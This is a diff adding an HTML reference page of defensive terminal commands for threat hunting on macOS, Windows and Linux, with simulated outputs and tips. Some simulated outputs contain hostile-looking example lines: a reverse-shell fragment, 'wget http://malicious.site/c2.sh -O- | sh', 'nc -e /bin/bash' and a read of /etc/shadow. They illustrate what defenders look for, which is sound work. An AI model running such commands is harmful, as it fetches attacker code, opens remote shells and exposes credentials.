@@ -1,0 +1,1006 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DIVINE CYBER DEFENSE - Command Line Matrix</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            skyblue: {
+              50: '#f0f9ff',
+              100: '#e0f2fe',
+              400: '#38bdf8',
+              500: '#0ea5e9',
+              600: '#0284c7',
+              800: '#075985',
+              900: '#0c4a6e',
+              950: '#082f49',
+            },
+            cyber: {
+              bg: '#031329',
+              card: 'rgba(8, 47, 73, 0.65)',
+              border: 'rgba(56, 189, 248, 0.3)',
+              gold: '#fbbf24',
+              white: '#ffffff',
+              glow: '#00e5ff'
+            }
+          },
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['Fira Code', 'monospace']
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      background-color: #031329;
+      color: #ffffff;
+      font-family: 'Inter', sans-serif;
+      overflow-x: hidden;
+    }
+
+    /* Custom Sky-Blue Canvas Background Effect */
+    #matrix-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: -1;
+      opacity: 0.25;
+      pointer-events: none;
+    }
+
+    /* Glassmorphism Cards */
+    .glass-card {
+      background: rgba(10, 37, 64, 0.7);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(56, 189, 248, 0.25);
+      box-shadow: 0 8px 32px 0 rgba(0, 191, 255, 0.15);
+    }
+
+    .glass-card:hover {
+      border-color: rgba(56, 189, 248, 0.5);
+      box-shadow: 0 8px 32px 0 rgba(0, 229, 255, 0.25);
+    }
+
+    .glow-text-cyan {
+      text-shadow: 0 0 10px rgba(56, 189, 248, 0.7), 0 0 20px rgba(56, 189, 248, 0.4);
+    }
+
+    .glow-text-gold {
+      text-shadow: 0 0 10px rgba(251, 191, 36, 0.7), 0 0 20px rgba(251, 191, 36, 0.4);
+    }
+
+    /* Custom Scrollbars */
+    ::-webkit-scrollbar {
+      width: 8px;
+      height: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #031329;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #0284c7;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #38bdf8;
+    }
+
+    .cmd-font {
+      font-family: 'Fira Code', monospace;
+    }
+
+    /* Pulse Cross Effect */
+    .divine-cross {
+      filter: drop-shadow(0 0 8px rgba(251, 191, 36, 0.8));
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col relative selection:bg-skyblue-500 selection:text-white">
+
+  <!-- Background Canvas (Sky-Blue Matrix Rain & Rays) -->
+  <canvas id="matrix-canvas"></canvas>
+
+  <!-- Notification Toast Container -->
+  <div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2"></div>
+
+  <!-- MAIN HUD WRAPPER -->
+  <div class="max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6 flex-1 flex flex-col">
+
+    <!-- TOP HUD HEADER -->
+    <header class="glass-card rounded-2xl p-6 mb-8 border border-skyblue-400/30 relative overflow-hidden">
+      <!-- Top Decorative Beam -->
+      <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-skyblue-400 to-transparent"></div>
+      
+      <div class="flex flex-col lg:flex-row justify-between items-center gap-6 relative z-10">
+        <!-- Title & Motif -->
+        <div class="flex items-center gap-4 text-center sm:text-left">
+          <div class="relative flex items-center justify-center w-16 h-16 rounded-xl bg-skyblue-900/80 border border-skyblue-400/50 shadow-lg shadow-skyblue-500/20">
+            <i class="fa-solid fa-cross text-cyber-gold text-3xl divine-cross"></i>
+            <i class="fa-solid fa-shield-halved text-skyblue-400 text-xs absolute bottom-1 right-1"></i>
+          </div>
+          <div>
+            <div class="flex items-center justify-center sm:justify-start gap-2">
+              <span class="px-2 py-0.5 text-[10px] uppercase font-mono font-bold tracking-widest bg-cyber-gold/20 text-cyber-gold border border-cyber-gold/40 rounded">
+                Soli Deo Gloria
+              </span>
+              <span class="px-2 py-0.5 text-[10px] uppercase font-mono font-bold tracking-widest bg-skyblue-500/20 text-skyblue-400 border border-skyblue-400/40 rounded">
+                Ethical Hacker Center
+              </span>
+            </div>
+            <h1 class="text-2xl sm:text-3xl lg:text-4xl font-extrabold text-white tracking-tight mt-1 glow-text-cyan">
+              DIVINE CYBER DEFENSE MATRIX
+            </h1>
+            <p class="text-xs sm:text-sm text-skyblue-100/80 font-mono mt-0.5">
+              Native Terminal Command Reference for Threat Hunting, Memory Auditing & Network Inspection
+            </p>
+          </div>
+        </div>
+
+        <!-- HUD Metrics & Clock -->
+        <div class="flex flex-wrap items-center justify-center sm:justify-end gap-3 text-xs font-mono">
+          <div class="bg-skyblue-950/80 px-4 py-2 rounded-lg border border-skyblue-500/30 text-center">
+            <div class="text-skyblue-400 text-[10px] uppercase">System Clock (UTC)</div>
+            <div id="live-clock" class="text-white font-bold text-sm">00:00:00 UTC</div>
+          </div>
+          <div class="bg-skyblue-950/80 px-4 py-2 rounded-lg border border-skyblue-500/30 text-center">
+            <div class="text-skyblue-400 text-[10px] uppercase">Commands Monitored</div>
+            <div class="text-cyber-gold font-bold text-sm" id="cmd-count">27 Tools</div>
+          </div>
+          <button id="btn-export-txt" onclick="downloadCheatSheet()" class="bg-gradient-to-r from-skyblue-600 to-skyblue-500 hover:from-skyblue-500 hover:to-skyblue-400 text-white font-bold px-4 py-2.5 rounded-lg border border-skyblue-300/40 shadow-lg shadow-skyblue-500/30 transition flex items-center gap-2 cursor-pointer">
+            <i class="fa-solid fa-download"></i>
+            <span>Export Sheet</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- SEARCH BAR & FILTER TABS -->
+      <div class="mt-6 pt-6 border-t border-skyblue-500/20 flex flex-col md:flex-row items-center justify-between gap-4">
+        <!-- Search Input -->
+        <div class="relative w-full md:w-96">
+          <i class="fa-solid fa-magnifying-glass absolute left-3.5 top-1/2 -translate-y-1/2 text-skyblue-400 text-sm"></i>
+          <input 
+            type="text" 
+            id="search-input"
+            placeholder="Search commands, tools, target (e.g. ports, tcpdump, ps)..." 
+            class="w-full bg-skyblue-950/90 text-white placeholder-skyblue-300/50 pl-10 pr-10 py-2.5 rounded-xl border border-skyblue-400/40 focus:outline-none focus:border-skyblue-400 focus:ring-2 focus:ring-skyblue-400/30 font-mono text-sm transition"
+            onkeyup="filterCommands()"
+          >
+          <button onclick="clearSearch()" id="clear-search-btn" class="hidden absolute right-3 top-1/2 -translate-y-1/2 text-skyblue-300 hover:text-white">
+            <i class="fa-solid fa-xmark"></i>
+          </button>
+        </div>
+
+        <!-- OS Filter Buttons -->
+        <div class="flex items-center gap-2 w-full md:w-auto overflow-x-auto pb-1 md:pb-0 font-mono text-xs">
+          <button onclick="setActiveOS('all')" id="btn-tab-all" class="os-tab-btn active px-4 py-2 rounded-lg border bg-skyblue-500 text-white border-skyblue-300 font-semibold shadow">
+            <i class="fa-solid fa-border-all mr-1"></i> ALL (3)
+          </button>
+          <button onclick="setActiveOS('macos')" id="btn-tab-macos" class="os-tab-btn px-4 py-2 rounded-lg border border-skyblue-500/40 bg-skyblue-950/60 text-skyblue-100 hover:bg-skyblue-800/40">
+            <i class="fa-brands fa-apple mr-1"></i> macOS
+          </button>
+          <button onclick="setActiveOS('windows')" id="btn-tab-windows" class="os-tab-btn px-4 py-2 rounded-lg border border-skyblue-500/40 bg-skyblue-950/60 text-skyblue-100 hover:bg-skyblue-800/40">
+            <i class="fa-brands fa-windows mr-1"></i> Windows
+          </button>
+          <button onclick="setActiveOS('linux')" id="btn-tab-linux" class="os-tab-btn px-4 py-2 rounded-lg border border-skyblue-500/40 bg-skyblue-950/60 text-skyblue-100 hover:bg-skyblue-800/40">
+            <i class="fa-brands fa-linux mr-1"></i> Linux
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <!-- OS SECTIONS WRAPPER -->
+    <main class="space-y-10 flex-1">
+
+      <!-- ========================================== -->
+      <!-- SECTION 1: macOS NATIVE COMMAND MATRIX     -->
+      <!-- ========================================== -->
+      <section id="section-macos" class="os-section space-y-4">
+        <div class="flex items-center justify-between border-b border-skyblue-400/30 pb-3">
+          <div class="flex items-center gap-3">
+            <div class="w-10 h-10 rounded-lg bg-skyblue-900/80 border border-skyblue-400/50 flex items-center justify-center text-white text-xl">
+              <i class="fa-brands fa-apple"></i>
+            </div>
+            <div>
+              <h2 class="text-xl font-bold text-white tracking-wide glow-text-cyan">
+                macOS Native Command Matrix
+              </h2>
+              <p class="text-xs text-skyblue-200/80 font-mono">Built-in Darwin & BSD CLI toolset for live analysis</p>
+            </div>
+          </div>
+          <span class="px-3 py-1 bg-skyblue-500/20 text-skyblue-300 font-mono text-xs rounded-full border border-skyblue-400/30">9 Utilities</span>
+        </div>
+
+        <div class="grid grid-cols-1 gap-4" id="grid-macos">
+          <!-- Populated dynamically via JavaScript -->
+        </div>
+      </section>
+
+      <!-- ========================================== -->
+      <!-- SECTION 2: WINDOWS NATIVE COMMAND MATRIX   -->
+      <!-- ========================================== -->
+      <section id="section-windows" class="os-section space-y-4 pt-4">
+        <div class="flex items-center justify-between border-b border-skyblue-400/30 pb-3">
+          <div class="flex items-center gap-3">
+            <div class="w-10 h-10 rounded-lg bg-skyblue-900/80 border border-skyblue-400/50 flex items-center justify-center text-white text-xl">
+              <i class="fa-brands fa-windows text-skyblue-400"></i>
+            </div>
+            <div>
+              <h2 class="text-xl font-bold text-white tracking-wide glow-text-cyan">
+                Windows Native Command Matrix
+              </h2>
+              <p class="text-xs text-skyblue-200/80 font-mono">CMD, PowerShell & Sysinternals-equivalent built-in tools</p>
+            </div>
+          </div>
+          <span class="px-3 py-1 bg-skyblue-500/20 text-skyblue-300 font-mono text-xs rounded-full border border-skyblue-400/30">9 Utilities</span>
+        </div>
+
+        <div class="grid grid-cols-1 gap-4" id="grid-windows">
+          <!-- Populated dynamically via JavaScript -->
+        </div>
+      </section>
+
+      <!-- ========================================== -->
+      <!-- SECTION 3: LINUX NATIVE COMMAND MATRIX     -->
+      <!-- ========================================== -->
+      <section id="section-linux" class="os-section space-y-4 pt-4">
+        <div class="flex items-center justify-between border-b border-skyblue-400/30 pb-3">
+          <div class="flex items-center gap-3">
+            <div class="w-10 h-10 rounded-lg bg-skyblue-900/80 border border-skyblue-400/50 flex items-center justify-center text-white text-xl">
+              <i class="fa-brands fa-linux text-cyber-gold"></i>
+            </div>
+            <div>
+              <h2 class="text-xl font-bold text-white tracking-wide glow-text-cyan">
+                Linux Native Command Matrix
+              </h2>
+              <p class="text-xs text-skyblue-200/80 font-mono">Standard POSIX & Systemd core diagnostic commands</p>
+            </div>
+          </div>
+          <span class="px-3 py-1 bg-skyblue-500/20 text-skyblue-300 font-mono text-xs rounded-full border border-skyblue-400/30">9 Utilities</span>
+        </div>
+
+        <div class="grid grid-cols-1 gap-4" id="grid-linux">
+          <!-- Populated dynamically via JavaScript -->
+        </div>
+      </section>
+
+      <!-- NO RESULTS NOTIFICATION -->
+      <div id="no-results" class="hidden glass-card rounded-2xl p-12 text-center space-y-3 my-8">
+        <i class="fa-solid fa-shield-virus text-4xl text-skyblue-400"></i>
+        <h3 class="text-lg font-bold text-white">No Matching Command Found</h3>
+        <p class="text-sm text-skyblue-200/70 font-mono">Try searching for keywords like "ports", "tcpdump", "process", or "file".</p>
+        <button onclick="clearSearch()" class="px-4 py-2 bg-skyblue-600 text-white rounded-lg font-mono text-xs hover:bg-skyblue-500">
+          Reset Filter
+        </button>
+      </div>
+
+    </main>
+
+    <!-- FOOTER / MOTIF -->
+    <footer class="mt-12 py-6 border-t border-skyblue-500/20 text-center font-mono text-xs text-skyblue-300/70 flex flex-col sm:flex-row justify-between items-center gap-4">
+      <div class="flex items-center gap-2">
+        <i class="fa-solid fa-cross text-cyber-gold"></i>
+        <span>Equipping Ethical Defenders for Good & Truth</span>
+      </div>
+      <div>
+        <span>Divine Cyber Defense Center &bull; Zero External Dependencies Required</span>
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- INTERACTIVE TERMINAL PREVIEW MODAL -->
+  <div id="terminal-modal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4 hidden">
+    <div class="glass-card max-w-3xl w-full rounded-2xl border border-skyblue-400/50 shadow-2xl overflow-hidden flex flex-col max-h-[85vh]">
+      <!-- Terminal Window Header -->
+      <div class="bg-skyblue-950 px-4 py-3 border-b border-skyblue-400/30 flex items-center justify-between">
+        <div class="flex items-center gap-2">
+          <div class="w-3 h-3 rounded-full bg-red-500/80"></div>
+          <div class="w-3 h-3 rounded-full bg-yellow-500/80"></div>
+          <div class="w-3 h-3 rounded-full bg-green-500/80"></div>
+          <span id="modal-title" class="ml-3 font-mono text-xs text-skyblue-300 font-semibold">terminal@divine-defense:~</span>
+        </div>
+        <button onclick="closeModal()" class="text-skyblue-400 hover:text-white text-lg">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+      </div>
+
+      <!-- Terminal Body -->
+      <div class="p-6 bg-cyber-bg/95 font-mono text-sm overflow-y-auto space-y-4 flex-1">
+        <div>
+          <span class="text-cyber-gold">Target Tool:</span> <span id="modal-tool" class="text-white font-bold">--</span>
+        </div>
+        <div>
+          <span class="text-cyber-gold">OS Context:</span> <span id="modal-os" class="text-skyblue-300">--</span>
+        </div>
+        <div class="bg-skyblue-950/80 p-3 rounded-lg border border-skyblue-500/30 flex items-center justify-between">
+          <code id="modal-cmd" class="text-white font-bold text-sm">--</code>
+          <button id="modal-copy-btn" onclick="copyModalCommand()" class="text-xs bg-skyblue-600 hover:bg-skyblue-500 text-white px-3 py-1.5 rounded transition">
+            <i class="fa-regular fa-copy"></i> Copy
+          </button>
+        </div>
+
+        <div>
+          <div class="text-xs text-skyblue-400 uppercase tracking-wider mb-1 font-bold">Simulated Output Preview:</div>
+          <pre id="modal-output" class="p-4 bg-black/90 rounded-lg text-emerald-400 border border-emerald-500/30 text-xs overflow-x-auto whitespace-pre-wrap leading-relaxed">Loading simulation...</pre>
+        </div>
+
+        <div class="text-xs text-skyblue-200/70 pt-2 border-t border-skyblue-500/20">
+          <strong class="text-white">Defense Tip:</strong> <span id="modal-tip">--</span>
+        </div>
+      </div>
+
+      <!-- Terminal Modal Footer -->
+      <div class="bg-skyblue-950/90 px-6 py-3 border-t border-skyblue-500/20 flex justify-end">
+        <button onclick="closeModal()" class="px-4 py-2 bg-skyblue-600 hover:bg-skyblue-500 text-white font-mono text-xs rounded-lg">
+          Close Window
+        </button>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ========================================== -->
+  <!-- JAVASCRIPT DATA & LOGIC                    -->
+  <!-- ========================================== -->
+  <script>
+    // DATA MATRIX FOR MACOS, WINDOWS, AND LINUX
+    const matrixData = [
+      // ---------------- MACOS DATA ----------------
+      {
+        id: 'mac-1',
+        os: 'macos',
+        target: 'Open Ports & Active Sockets',
+        tool: 'lsof',
+        command: 'lsof -i -P -n | grep -E "LISTEN|ESTABLISHED"',
+        purpose: 'Lists open network files/sockets, mapping listening ports and established connections directly to Process Name and PID.',
+        simulatedOutput: `COMMAND   PID   USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
+ControlCe 482   user   11u  IPv4 0x8a92f801        0t0  TCP *:7000 (LISTEN)
+UserEvent 512   user   14u  IPv4 0x8a92f912        0t0  TCP 192.168.1.105:51204->172.217.16.206:443 (ESTABLISHED)`,
+        tip: 'Check for unexpected binaries bound to non-standard high ports.'
+      },
+      {
+        id: 'mac-2',
+        os: 'macos',
+        target: 'Active Network Sockets',
+        tool: 'netstat',
+        command: 'netstat -anv -p tcp | grep ESTABLISHED',
+        purpose: 'Native socket status viewer showing local/remote address pairs, send/receive buffers, and owning PID.',
+        simulatedOutput: `tcp4  0  0  192.168.1.105.54122  142.250.190.46.443  ESTABLISHED  131072 131072   8412`,
+        tip: 'Useful for auditing network connections when lsof requires higher privileges.'
+      },
+      {
+        id: 'mac-3',
+        os: 'macos',
+        target: 'Real-Time Network Bandwidth',
+        tool: 'nettop',
+        command: 'nettop -m tcp -L 5',
+        purpose: 'Built-in interactive BSD terminal bandwidth monitor showing bytes sent/received per process and remote IP.',
+        simulatedOutput: `process / socket                     bytes_in    bytes_out
+com.apple.WebKit.Networking.1204      1428502      204128
+  tcp4 192.168.1.105:52011<->104.16.2.1:443   1402110      190200`,
+        tip: 'Great native alternative to ntopng without needing extra brew packages.'
+      },
+      {
+        id: 'mac-4',
+        os: 'macos',
+        target: 'Files Being Opened (Live)',
+        tool: 'opensnoop',
+        command: 'sudo opensnoop -v',
+        purpose: 'DTrace script capturing every file open system call across the OS in real-time with timestamp and process name.',
+        simulatedOutput: `UID    PID COMM          FD PATH
+  0    412 SecurityAgent    3 /etc/pam.d/system.login
+501   8412 Google Chrome    8 /Users/user/Library/Application Support/Google/Chrome/Default/Cookies`,
+        tip: 'Reveals fileless malware or scripts touching temporary staging paths like /tmp.'
+      },
+      {
+        id: 'mac-5',
+        os: 'macos',
+        target: 'File Integrity & Syscalls',
+        tool: 'fs_usage',
+        command: 'sudo fs_usage -w -f filesys',
+        purpose: 'Real-time filesystem call reporter monitoring reads, writes, opens, and directory creations across all volumes.',
+        simulatedOutput: `13:42:01  open              /private/var/db/diagnostics/logdata     0.000021   python3.9   
+13:42:01  write       [ 4096] /Users/user/.config/temp.key          0.000104   bash`,
+        tip: 'Helps identify ransomware encryption behaviors in real time.'
+      },
+      {
+        id: 'mac-6',
+        os: 'macos',
+        target: 'Active Scripts & Programs',
+        tool: 'ps aux',
+        command: 'ps auxww | grep -E "python|bash|zsh|sh|osascript"',
+        purpose: 'Full untruncated process status listing with full command-line arguments to spot obfuscated scripts.',
+        simulatedOutput: `user 9122  0.0  0.1  408102316  12104 s001  S+   1:41PM   0:00.04 python3 -c import socket,subprocess,os;s=socket.socket()...`,
+        tip: 'Always look for long base64 strings or python inline -c execution.'
+      },
+      {
+        id: 'mac-7',
+        os: 'macos',
+        target: 'Endpoint Security Logging',
+        tool: 'eslogger',
+        command: 'sudo eslogger process_exec | grep -i "args"',
+        purpose: 'Native macOS Endpoint Security API CLI client recording process execution events, code signatures, and parents.',
+        simulatedOutput: `{"event":{"exec":{"target":{"executable":{"path":"/usr/bin/curl"},"signing_id":"com.apple.curl"}}},"version":1}`,
+        tip: 'Modern successor to OpenBSM auditing on macOS 10.15+.'
+      },
+      {
+        id: 'mac-8',
+        os: 'macos',
+        target: 'Building-Wide LAN Neighbors',
+        tool: 'arp',
+        command: 'arp -a -n',
+        purpose: 'Displays local Address Resolution Protocol (ARP) cache mapping IP addresses to physical MAC hardware addresses.',
+        simulatedOutput: `? (192.168.1.1) at b8:27:eb:bf:9d:11 on en0 ifscope [ethernet]
+? (192.168.1.120) at 70:85:c2:41:02:aa on en0 ifscope [ethernet]`,
+        tip: 'Detects ARP spoofing / Man-In-The-Middle attacks on the local network.'
+      },
+      {
+        id: 'mac-9',
+        os: 'macos',
+        target: 'Packet Capture & Inspection',
+        tool: 'tcpdump',
+        command: 'sudo tcpdump -i en0 -nn -v "not port 22"',
+        purpose: 'Low-level network packet sniffer filtering headers, flags, and payload summaries on network interfaces.',
+        simulatedOutput: `13:45:02.102931 IP 192.168.1.105.52041 > 192.168.1.1.53: 41201+ A? api.github.com. (32)
+13:45:02.124102 IP 192.168.1.1.53 > 192.168.1.105.52041: 41201 1/0/0 A 140.82.121.4 (48)`,
+        tip: 'Filter out known benign traffic like SSH (port 22) to focus on anomalies.'
+      },
+
+      // ---------------- WINDOWS DATA ----------------
+      {
+        id: 'win-1',
+        os: 'windows',
+        target: 'Open Ports & Active Sockets',
+        tool: 'netstat',
+        command: 'netstat -ano | findstr /i "LISTENING ESTABLISHED"',
+        purpose: 'Displays all active TCP/UDP ports, local/foreign addresses, socket state, and owning Process ID (PID).',
+        simulatedOutput: `  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       904
+  TCP    192.168.1.110:49672    52.182.143.21:443      ESTABLISHED     3412`,
+        tip: 'Cross-reference PID with Tasklist to identify the binary.'
+      },
+      {
+        id: 'win-2',
+        os: 'windows',
+        target: 'Advanced Socket & Process Map',
+        tool: 'Get-NetTCPConnection',
+        command: 'Get-NetTCPConnection -State Established | Select-Object Local*, Remote*, OwningProcess',
+        purpose: 'PowerShell cmdlet returning object-oriented socket data including process IDs, state, and creation time.',
+        simulatedOutput: `LocalAddress   LocalPort RemoteAddress  RemotePort OwningProcess
+------------   --------- -------------  ---------- -------------
+192.168.1.110  51024     13.107.21.200  443        4120`,
+        tip: 'Filter by -RemotePort to catch non-standard egress C2 channels.'
+      },
+      {
+        id: 'win-3',
+        os: 'windows',
+        target: 'Active Scripts & Executables',
+        tool: 'Get-Process',
+        command: 'Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine',
+        purpose: 'Queries WMI to fetch running processes alongside complete command-line strings to catch hidden script tags.',
+        simulatedOutput: `ProcessId Name           CommandLine
+--------- ----           -----------
+4120      powershell.exe powershell.exe -e a3d3c2ls... (Encoded payload)`,
+        tip: 'EncodedCommand (-e or -enc) is a top indicator of fileless PowerShell execution.'
+      },
+      {
+        id: 'win-4',
+        os: 'windows',
+        target: 'PowerShell ScriptBlock Logs',
+        tool: 'Get-WinEvent',
+        command: 'Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104}',
+        purpose: 'Inspects Event ID 4104 logs containing full un-obfuscated PowerShell script block contents executed in memory.',
+        simulatedOutput: `TimeCreated          Id LevelDisplayName Message
+-----------          -- ---------------- -------
+11/06/2026 13:40:11 4104 Information      Creating Scriptblock text (1 of 1): Invoke-ReflectivePEInjection...`,
+        tip: 'ScriptBlock logging captures code execution even if obfuscated.'
+      },
+      {
+        id: 'win-5',
+        os: 'windows',
+        target: 'Process & DLL Inspection',
+        tool: 'Tasklist',
+        command: 'tasklist /m /fi "STATUS eq RUNNING"',
+        purpose: 'Lists active processes and loaded DLL modules to detect injected malicious dynamic link libraries.',
+        simulatedOutput: `Image Name                   PID Modules
+========================= ====== ============================================
+svchost.exe                  892 ntdll.dll, kernel32.dll, advapi32.dll`,
+        tip: 'Spot DLL injection by looking for unusual DLLs in standard processes.'
+      },
+      {
+        id: 'win-6',
+        os: 'windows',
+        target: 'Audit & Subsystem Policy',
+        tool: 'Auditpol',
+        command: 'auditpol /get /category:* | findstr /i "Success Failure"',
+        purpose: 'Displays security event logging policies to verify process creation and object access logging is active.',
+        simulatedOutput: `  Detailed Tracking             Process Creation          Success and Failure
+  Logon/Logoff                  Logon                     Success`,
+        tip: 'Ensure "Process Creation" audit policy is set to Success/Failure.'
+      },
+      {
+        id: 'win-7',
+        os: 'windows',
+        target: 'Building-Wide LAN Neighbors',
+        tool: 'arp',
+        command: 'arp -a',
+        purpose: 'Displays Windows ARP cache detailing local subnet host MAC addresses and interface bindings.',
+        simulatedOutput: `Interface: 192.168.1.110 --- 0xb
+  Internet Address      Physical Address      Type
+  192.168.1.1           b8-27-eb-bf-9d-11     dynamic
+  192.168.1.150         00-11-32-4f-21-02     dynamic`,
+        tip: 'Look for duplicate MAC addresses assigned to different IP addresses.'
+      },
+      {
+        id: 'win-8',
+        os: 'windows',
+        target: 'Native Packet Monitor',
+        tool: 'Pktmon',
+        command: 'pktmon start --etw -m rx -p 80 443 & pktmon format Pktmon.etl',
+        purpose: 'Built-in Windows network packet loss diagnostics & packet sniffing framework without Wireshark dependencies.',
+        simulatedOutput: `Pktmon: Packet Monitor Started. Logging to Pktmon.etl
+Formatted 140 packets into text format.`,
+        tip: 'Pktmon is built into Windows 10/11 and Windows Server 2019+.'
+      },
+      {
+        id: 'win-9',
+        os: 'windows',
+        target: 'Persistence & Scheduled Tasks',
+        tool: 'Get-ScheduledTask',
+        command: 'Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, TaskPath',
+        purpose: 'Audits scheduled tasks used as backdoor persistence mechanisms across boot and logon events.',
+        simulatedOutput: `TaskName                   TaskPath
+--------                   --------
+UpdateCheckTask            \\Microsoft\\Windows\\SystemRestore\\
+UpdaterService             \\Users\\AppData\\Local\\Temp\\`,
+        tip: 'Tasks pointing to Temp or AppData paths are suspicious.'
+      },
+
+      // ---------------- LINUX DATA ----------------
+      {
+        id: 'lin-1',
+        os: 'linux',
+        target: 'Open Ports & Listening Sockets',
+        tool: 'ss',
+        command: 'ss -tulpn | grep LISTEN',
+        purpose: 'Modern, ultra-fast replacement for netstat dumping TCP/UDP listening sockets, process names, and PIDs.',
+        simulatedOutput: `Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process                                 
+tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*     users:(("sshd",pid=712,fd=3))
+tcp   LISTEN 0      80         127.0.0.1:3306        0.0.0.0:*     users:(("mysqld",pid=1102,fd=21))`,
+        tip: 'Prefer `ss` over `netstat` on modern Linux kernel distributions.'
+      },
+      {
+        id: 'lin-2',
+        os: 'linux',
+        target: 'Active Connection Sockets',
+        tool: 'netstat',
+        command: 'netstat -antp | grep ESTABLISHED',
+        purpose: 'Legacy socket inspection tool displaying active connections along with process program names.',
+        simulatedOutput: `tcp  0  0 192.168.1.120:22  192.168.1.105:51204  ESTABLISHED 1402/sshd: user [pr`,
+        tip: 'Standard utility available across older legacy Linux servers.'
+      },
+      {
+        id: 'lin-3',
+        os: 'linux',
+        target: 'Building-Wide LAN Neighbors',
+        tool: 'ip neighbor / arp',
+        command: 'ip neighbor show',
+        purpose: 'Shows IP-to-MAC hardware mappings in the kernel neighbor table for local building devices.',
+        simulatedOutput: `192.168.1.1 dev eth0 lladdr b8:27:eb:bf:9d:11 REACHABLE
+192.168.1.105 dev eth0 lladdr 70:85:c2:41:02:aa STALE`,
+        tip: 'Modern replacement for legacy `arp` command.'
+      },
+      {
+        id: 'lin-4',
+        os: 'linux',
+        target: 'Packet Capture & Wire Traffic',
+        tool: 'tcpdump',
+        command: 'sudo tcpdump -i eth0 -nn -c 20 "tcp[tcpflags] & (tcp-syn) != 0"',
+        purpose: 'Captures raw packet streams on interface eth0, here specifically filtering TCP SYN port scans.',
+        simulatedOutput: `13:50:01.102 IP 192.168.1.200.4120 > 192.168.1.120.80: Flags [S], seq 1041201
+13:50:01.103 IP 192.168.1.200.4121 > 192.168.1.120.443: Flags [S], seq 904122`,
+        tip: 'Identifies incoming Nmap / Masscan port scanning attempts.'
+      },
+      {
+        id: 'lin-5',
+        os: 'linux',
+        target: 'Open Files & Socket Handles',
+        tool: 'lsof / fuser',
+        command: 'sudo lsof -i :80 -i :443 -u ^root',
+        purpose: 'Lists open internet files/sockets on web ports excluding root user to flag untrusted web process owners.',
+        simulatedOutput: `COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+www-data 2104 www-data    4u  IPv4  24102      0t0  TCP *:80 (LISTEN)`,
+        tip: 'Great for auditing web server compromise and webshell backdoors.'
+      },
+      {
+        id: 'lin-6',
+        os: 'linux',
+        target: 'Systemd Real-Time Logs',
+        tool: 'journalctl',
+        command: 'sudo journalctl -xf -u ssh --no-pager',
+        purpose: 'Follows real-time systemd journal logs for SSH service to detect live brute-force login attempts.',
+        simulatedOutput: `Nov 06 13:51:02 debian sshd[3102]: Failed password for invalid user admin from 192.168.1.222 port 40120 ssh2
+Nov 06 13:51:04 debian sshd[3104]: Failed password for root from 192.168.1.222 port 40122 ssh2`,
+        tip: 'Instantly highlights unauthorized authentication spikes.'
+      },
+      {
+        id: 'lin-7',
+        os: 'linux',
+        target: 'Active Scripts & Tree',
+        tool: 'ps / htop',
+        command: 'ps auxf | grep -E "python|perl|php|sh|bash"',
+        purpose: 'Forest/tree formatted process display showing parent-child process inheritance and script paths.',
+        simulatedOutput: `www-data  3412  \\_ /usr/bin/php-fpm
+www-data  3490      \\_ /bin/sh -c wget http://malicious.site/c2.sh -O- | sh`,
+        tip: 'Parent-child tree exposes webshell command execution origins.'
+      },
+      {
+        id: 'lin-8',
+        os: 'linux',
+        target: 'Kernel Audit Logs',
+        tool: 'auditctl / ausearch',
+        command: 'sudo ausearch -m EXECVE -ts recent',
+        purpose: 'Searches Linux Audit Daemon logs for recent executive binary system calls and exact command arguments.',
+        simulatedOutput: `type=EXECVE msg=audit(1699278600.412:201): argc=3 a0="nc" a1="-e" a2="/bin/bash"`,
+        tip: 'Reveals netcat reverse shell creation logs.'
+      },
+      {
+        id: 'lin-9',
+        os: 'linux',
+        target: 'System Call Tracing',
+        tool: 'strace',
+        command: 'sudo strace -p <PID> -e trace=network,file -s 256',
+        purpose: 'Attaches directly to a running process ID to intercept network socket creation and file modifications.',
+        simulatedOutput: `connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("198.51.100.1")}, 16) = -1 EINPROGRESS
+openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES`,
+        tip: 'Deep-dive dynamic reverse engineering tool for suspicious processes.'
+      }
+    ];
+
